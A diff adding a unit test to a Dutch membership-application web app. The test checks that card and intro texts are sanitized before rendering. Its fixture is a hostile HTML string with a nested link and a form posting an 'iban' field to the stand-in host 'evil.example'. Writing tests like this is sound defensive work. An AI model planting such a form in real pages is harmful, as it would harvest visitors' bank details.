@@ -163,3 +163,19 @@ class TestWordLidPage(ApplicationDoorMixin, VereningingenUnitTestCase):
     def test_confirm_page_sends_no_referrer(self):
         html = self._page_get("word-lid/bevestig", submission="x", token="y").get_data(as_text=True)
         self.assertIn('name="referrer" content="no-referrer"', html)
+
+    def test_card_and_intro_text_cannot_carry_links_or_form_controls(self):
+        """The card is rendered inside the door's own link, and the intro next to the application
+        form: a nested link or a form posting elsewhere must not survive."""
+        hostile = '<p>Tekst <a href="/elders">link</a></p><form action="//evil.example"><input name="iban"></form>'
+        door = self._door(title="Vijandige deur")
+        frappe.db.set_value(
+            "Membership Application Door", door.name, {"card_text": hostile, "intro_text": hostile}
+        )
+        landing = self._page_get("word-lid").get_data(as_text=True)
+        door_page = self._render_page_html(door.slug)
+        self.assertTrue("Tekst" in landing and "Tekst" in door_page, "control: the texts are rendered")
+        self.assertFalse('href="/elders"' in landing, "no link nested in the card's link")
+        for label, html in (("landing", landing), ("door", door_page)):
+            with self.subTest(label):
+                self.assertFalse("evil.example" in html, "no form posting elsewhere")
